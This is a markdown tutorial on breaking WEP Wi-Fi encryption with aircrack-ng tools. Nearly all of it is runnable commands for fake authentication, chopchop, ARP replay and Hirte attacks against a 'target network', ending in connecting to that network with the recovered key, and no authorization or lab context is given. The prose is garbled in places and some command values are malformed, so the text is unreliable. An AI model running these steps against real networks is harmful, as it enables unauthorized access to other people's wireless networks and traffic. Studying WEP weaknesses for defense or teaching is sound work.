# Break WEP Encryption

**WEP:** WEP (Wired Equivalent Privacy) is an encryption was the first standardized way of securing wireless networks. Its uses RC4 (Pivest Cipher 4) algorithm that's mean each packet is encrypted *THE (AP)* encrypt the packet and send it to the air, then the client receive the packet and the client has the key then he will decrypt it and read all the data.

**WEP** is use 2 keys to encrypt each by the of information:

- It's a unique key steam by using a 24-bit is random number. Called an **IV (Initializing Vector)**. And its sent as a plain text.

- Approximately 9,000 the possible I6 mission I6 million IVS are called **WEAK IVS**. Using a weak IV reveals more information about the configured key than other IVS.


## Cracking WEP Encryption

You have to monitor mood in network. Checking your mode as befoure,

`iwconfig`

`airodump-ng wlan0mon`

`airodump-ng -c 2 --bssid XX:XX:XX:XX:XX:XX --write creakingwepdemo wlan0mon`

Open another terminal window and using **aircrack-ng** tool.

`aircrack-ng creakingwepdemo-01.cap`

Its time little bit log for cracking. Until we get the key the process is on. Sometimes its need an hours. But the network is busy then we can get the key in 5 to 20 minutes. The key is, `01:73:10:64:00`. Remove the clone and get the password '0173106400'.After the process we can stop the airmon-ng.

`airmon-ng stop wlan0mon`


## Fake Authentication with The Target Network

Always make sure your wi-fi card is in monitor mood. We will use this method when no client is connected or your own choose.

`iwconfig`

`airodump-ng wlan0mon`		# scan the network for the target

`airodump-ng -c 2 --bssid XX:XX:XX:XX:XX:XX wlan0mon`		# specific scan the target network

**Crate a fake authenticate of the network.**

Open a terminal and write this command:

`ifconfig wlan0mon`

You will get the unspece number. Then open a new terminal and use aireplay-ng tools. Get the first 12 degit of unspece number and replace to the dash (-) to clone (:).

`aireplay-ng --fakeauth 0 -a XX:XX:XX:XX:XX:XX -h 44:33:4c:40:49:c3 wlan0mon`

You will see a new client in target network. That is the fake authenticate user. Then you can use creaking WEP Encryption.


## Creaking WEP Using KOREK CHOPCHOP Attack.

### Step:

- Capture the ARP packets from the network.
- Forge it to a new packets.
- Inject in to the network.

Specify the target network:
`airodump-ng -c 2 --bssid XX:XX:XX:XX:XX:XX --write chopchop wlan0mon`

Open another terminal and use aireplay tools:
`aireplay-ng --fakeauth 0 -a XX:XX:XX:XX:XX:XX -h 44:33:4c:40:49:c3 wlan0mon`

Now we paly chopchop attack:
`aireplay-ng --chopchop -b XX:XX:XX:XX:XX:XX -h 44:33:4c:40:49:c3 wlan0mon`

Then method ask me "User theis packet?". We have to press n (no).

Reassociate the command,

`aireplay-ng --fakeauth 0 -a XX:XX:XX:XX:XX:XX -h 44:33:4c:40:49:c3 wlan0mon`

and 

`aireplay-ng --chopchop -b XX:XX:XX:XX:XX:XX -h 44:33:4c:40:49:c3 wlan0mon`

Untill the encreption code will not show in 3 or 4 line. This time we will press y (yes). After the complete the process then open another terminal.

`packetforge-ng -0 -a XX:XX:XX:XX:XX:XX -h 44:33:4c:40:49:c3 -k 255.255.255.2555 -l 255.255.255.255 -y replace_dec_1103...xor -w chopchopInject`


```
packetforge-ng		-> tool
-a					-> Mac address of the target network
-h					-> mac address is the my own wi-fi network
-k					-> destination ip
-l					-> source ip
-y					-> specify the file (replace_dec_1103...xor you will get this file when chopchop attack is complete.)
-w					-> write file
```

Reassociate again.

`aireplay-ng --fakeauth 0 -a XX:XX:XX:XX:XX:XX -h 44:33:4c:40:49:c3 wlan0mon`

Then use this command:

`aireplay-ng -2 -r chopchopInject wlan0mon`

```
aireplay-ng		-> tool
-2				-> replay
-r				-> read the file we have created
wlan0mon		-> wi-fi card name
```

This time application ask "Use this packet?" just type y (yes). Open another terminal and use this command:

`aircrack-ng chopchop-01.cap`

You will see a few seconds you will get the key. Stop monitor mood and connect your target network.


## Cracking WEP Using ARP Request Replace Attack

### Step:

- Capture an ARP packets from the network
- Inject into the traffic
- Generate a new packets with new IVS
- Capture those packets again and inject it into the traffic again

Now we have to target first.

`airodump-ng -c 2 -bssid XX:XX:XX:XX:XX:XX --write ARPAttack wlan0mon`

If this network have no client then create a fake authenticate user. Open a new terminal,

`aireplay-ng --fakeauth 0 -a XX:XX:XX:XX:XX:XX -h 44:33:4c:40:49:c3 wlan0mon`

Now we will creack the key or inject the packet. Open another terminal.

`aireplay-ng --arpreplay -b XX:XX:XX:XX:XX:XX -h XX:XX:XX:XX:XX:XX wlan0mon`

Then reauthenticate the user.

`aireplay-ng --fakeauth 0 -a XX:XX:XX:XX:XX:XX -h 44:33:4c:40:49:c3 wlan0mon`

Now after few time passed open a new terminal and use aircrack-ng tool.

`aircrack-ng ARPAttack-01.cap`

Now we have wait until the creack process is complete and key is found.


## Cracking WEP Using HIRTE Attack

### Steps:

- Setup a fake WEP AP and waits for a client to connect.
- Upon connection of a client waits for auto-configuration IP address.
- Clietn sends and ARP packet.
- Obtain the ARP packet and converts it into an ARP request for the same client.
- Client replaces.
- Collect these packets.
- Crack the WEP key.

Specify the target network:

`airodump-ng wlan0mon`

`airodump-ng -c 2 --bssid XX:XX:XX:XX:XX:XX --write HirteAttack wlan0mon`

`aireplay-ng -7 -h XX:XX:XX:XX:XX:XX -D wlan0mon`

Open another terminal and crack the key.

`aircrack-ng HirteAttack-01.cap`

Then we have to wait for the key. After the getting key then enable manage mode and connect your target wi-fi network.
